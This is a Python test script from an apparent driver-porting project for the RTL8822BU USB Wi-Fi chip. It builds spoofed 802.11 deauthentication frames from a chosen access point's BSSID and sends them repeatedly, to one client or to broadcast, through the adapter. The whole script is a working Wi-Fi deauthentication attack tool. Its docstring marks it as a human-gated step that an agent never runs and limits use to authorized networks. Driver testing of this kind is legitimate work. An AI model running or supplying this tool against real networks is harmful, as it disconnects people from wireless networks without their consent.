"""RTL8822BU (DKMS port) — LIVE deauthentication TX test.

**THIS FIRES REAL 802.11 FRAMES.** It is the human-gated step (PORTING.md step 5/7): the agent never
runs it. Builds an 802.11 deauth (FC=0xc0) spoofed from --bssid, to --client (default broadcast),
prepends the TX descriptor (`tx.build_inject_txdesc`, byte-diffed vs the captured aireplay injector),
and bulk-OUTs it --count times on --channel. Only use against networks you are authorized to test.

    uv run python scripts/rtl8822bu_dkms/deauth_hw.py --bssid AA:BB:CC:DD:EE:FF --channel 6
    uv run python scripts/rtl8822bu_dkms/deauth_hw.py --bssid AA:.. --client 11:22:33:44:55:66 --count 64
"""
from __future__ import annotations

import argparse
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent.parent / "src"))

import libusb_package
import usb.core
import usb.util

from wifit3.chips.rtl8822bu_dkms import bringup, chan, mac, tx, txpower
from wifit3.chips.rtl8822bu_dkms.transport import Rtl8822buTransport

USB_VID, USB_PID = 0x2357, 0x0138
_BROADCAST = b"\xff\xff\xff\xff\xff\xff"


def _mac(s: str) -> bytes:
    try:
        b = bytes(int(x, 16) for x in s.split(":"))
    except ValueError:
        raise argparse.ArgumentTypeError(f"bad MAC {s!r}")
    if len(b) != 6:
        raise argparse.ArgumentTypeError(f"MAC must be 6 octets: {s!r}")
    return b


def build_deauth(bssid: bytes, client: bytes, reason: int = 0x0007) -> bytes:
    """An 802.11 deauthentication MPDU: addr1=DA (client/broadcast), addr2=SA=BSSID, addr3=BSSID.
    seq ctl is 0 (the HW stamps it via the descriptor's EN_HWSEQ); reason 7 = class-3-frame-from-a-
    nonassociated-STA (the standard aireplay deauth reason)."""
    return (b"\xc0\x00"                       # frame control: type=mgmt, subtype=deauth
            b"\x00\x00"                        # duration
            + client + bssid + bssid          # addr1 (DA), addr2 (SA), addr3 (BSSID)
            + b"\x00\x00"                      # sequence control (HW-assigned)
            + (reason & 0xFFFF).to_bytes(2, "little"))


def main() -> int:
    ap = argparse.ArgumentParser(description="LIVE 802.11 deauth TX (RTL8822BU dkms port)")
    ap.add_argument("--bssid", type=_mac, required=True, help="AP BSSID (addr2/addr3)")
    ap.add_argument("--client", type=_mac, default=_BROADCAST,
                    help="target client (addr1); default broadcast")
    ap.add_argument("--channel", type=int, required=True, help="AP channel")
    ap.add_argument("--count", type=int, default=16, help="deauth frames to send")
    ap.add_argument("--reason", type=lambda s: int(s, 0), default=0x0007)
    args = ap.parse_args()

    backend = libusb_package.get_libusb1_backend()
    dev = usb.core.find(idVendor=USB_VID, idProduct=USB_PID, backend=backend)
    if dev is None:
        print(f"[FAIL] RTL8822BU not found ({USB_VID:04x}:{USB_PID:04x}). Plug in + WinUSB-bind (Zadig).")
        return 1
    try:
        if dev.is_kernel_driver_active(0):
            dev.detach_kernel_driver(0)
    except (NotImplementedError, usb.core.USBError):
        pass
    dev.set_configuration()
    usb.util.claim_interface(dev, 0)
    t = Rtl8822buTransport(dev)
    try:
        print("[*] cold bring-up + channel tune (with TX power)...")
        _info, e = bringup.cold_bringup(t)
        if e.mac_address:
            mac.set_mac_addr(t, e.mac_address)
        chan.set_channel_bw(t, args.channel, txpwr_pg=txpower.parse_pg(e.log_map))
        mac.enable_monitor(t)

        frame = build_deauth(args.bssid, args.client, args.reason)
        payload = tx.build_inject_txdesc(frame)
        print(f"[*] deauth  DA={args.client.hex(':')}  BSSID={args.bssid.hex(':')}  "
              f"ch {args.channel}  x{args.count}  ({len(payload)} B desc+frame)")
        for _ in range(args.count):
            t.bulk_out(payload)
            time.sleep(0.01)
        print(f"[PASS] sent {args.count} deauth frames (bulk-OUT EP 0x05).")
        return 0
    finally:
        try:
            usb.util.release_interface(dev, 0)
            usb.util.dispose_resources(dev)
        except usb.core.USBError:
            pass


if __name__ == "__main__":
    sys.exit(main())
